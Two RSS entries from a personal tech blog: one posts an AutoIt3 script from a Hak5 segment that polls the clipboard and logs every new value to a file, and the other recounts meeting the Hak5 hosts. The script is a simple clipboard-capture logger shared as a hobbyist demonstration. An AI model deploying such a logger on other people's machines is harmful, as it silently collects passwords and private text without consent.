    <description><![CDATA[Since it&rsquo;s Christmas and all, I thought I&rsquo;d post the code snippet from my Hak5 segment a bit early:
1 2 3 4 5 6 7 8 9 10 11 12 13 #include &lt;Clipboard.au3&gt; #include &lt;File.au3&gt; $oldclip = &#34;&#34; While 1 $clip = _ClipBoard_GetData() If $clip &lt;&gt; &#34;0&#34; Then If $clip &lt;&gt; $oldclip Then _FileWriteLog(@UserProfileDir &amp; &#34;clip.log&#34;, $clip) $oldclip = $clip EndIf EndIf Sleep(100) WEnd It&rsquo;s pretty straight forward, and I welcome everyone to install AutoIt3 and compile/run the above script to see what it does (although most of you I&rsquo;m sure can figure it out just by reading it).]]></description>

    <description><![CDATA[December 2nd, I drove down to Williamsburg VA to meet up with the guys from Hak.5 and Frank Linhares. For those of you who don&rsquo;t know. Hak.5 is an IPTV (Vidcast) show, which basically boils down to a TV show on the internet. Anyways, I got to meet up with these fellas and a couple other interesting people. While I was there, I had the privilege of helping out not only in the live techPhile podcast by Frank Linhares, but also the &lsquo;glue&rsquo; segments of Ep 5 of Hak.]]></description>
